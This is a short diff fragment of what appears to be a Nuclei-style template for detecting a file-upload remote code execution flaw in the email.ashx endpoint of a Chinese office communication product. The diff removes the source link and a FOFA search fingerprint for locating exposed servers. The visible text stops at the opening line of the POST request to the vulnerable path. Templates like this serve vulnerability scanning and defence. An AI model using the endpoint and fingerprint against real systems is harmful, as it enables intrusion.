@@ -3,12 +3,8 @@ info:
   name: 傲发办公通信专家 email.ashx 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gt3u6un8u43foxyd'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gt3u6un8u43foxyd
-    fofa: body="getincommingcall"
 http:
 - raw:
   - 'POST /handle/email.ashx?action=updatefiles&logname=stc HTTP/1.1
